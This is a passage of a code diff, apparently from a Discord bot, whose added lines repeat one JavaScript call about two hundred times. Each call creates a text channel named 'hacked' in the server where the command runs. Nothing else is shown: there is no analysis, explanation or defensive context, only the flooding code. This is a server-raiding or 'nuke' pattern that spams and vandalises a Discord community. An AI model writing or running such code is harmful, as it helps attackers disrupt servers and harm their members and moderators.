+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });   await msg.guild.channels.create("hacked", {
+      type: "text"
+    });
  
  
 
